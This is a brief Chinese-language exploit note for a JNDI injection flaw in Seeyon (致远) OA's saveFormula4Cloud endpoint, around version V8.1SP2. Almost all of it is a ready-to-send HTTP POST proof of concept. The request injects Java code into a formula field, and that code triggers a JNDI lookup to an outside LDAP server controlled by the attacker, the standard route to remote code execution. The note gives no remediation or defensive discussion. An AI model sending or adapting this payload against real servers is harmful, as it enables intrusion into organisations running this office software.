## 致远oa系统saveFormula4Cloud存在JNDI注入

V8.1SP2上下

## poc

```
POST /seeyon/ajax.do?method=ajaxAction&managerName=formulaManager&managerMethod=saveFormula4Cloud HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Cozilla/5.0 (Vindows Et 6.1; Sow64; rident/7.0; rv:11.0)
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=36B0163EA8D303B27AFEBDF158D0AF6C;
Cache-Control: no-cache
Content-Encoding: deflate
Pragma: no-cache
Host: xxxxx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 311
Connection: close
X-Forwarded-For: 1.2.3.4

arguments=
{"formulaName":"test","formulaAlias":"safe_pre","formulaType":"2","formulaExpression":"",
"sample":"javax.naming.InitialContext initialContext = new javax.naming.InitialContext();Object lookup = initialContext.lookup(\"ldap://xx.xx.xx.xx\");"}
```

